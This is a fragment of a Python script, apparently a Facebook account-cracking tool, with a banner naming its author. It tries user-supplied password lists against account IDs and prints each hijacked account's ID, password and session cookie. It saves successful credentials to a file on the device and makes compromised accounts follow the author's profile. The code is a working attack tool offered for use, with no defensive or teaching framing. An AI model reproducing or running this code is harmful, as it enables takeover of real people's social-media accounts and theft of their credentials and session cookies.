...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/DR.N00R.AFRIDI', {
...
\033[0;93m
╔══════════════════════════════════════════╗🖤"
║Author   : 𝐌𝐑. 𝐇𝐀𝐂𝐊𝐄𝐑 𝐀𝐅𝐑𝐈𝐃𝐈
║YouTube   : 𝐃𝐑 𝐍𝐎𝐎𝐑 𝐀𝐅𝐑𝐈𝐃𝐈
║Facebook : 𝐃𝐑 𝐍𝐎𝐎𝐑 𝐀𝐅𝐑𝐈𝐃𝐈
║Version  : 4.0.1                       
╚══════════════════════════════════════════╝💔"\033[1;31m
    """) 
loop = 0
...
def xxr():
    ...
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {Afridi+1} : ")
        HamiiID.append(pww)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[AFRIDI-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AFRIDI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[DOCTOR-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr} AFRIDI{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
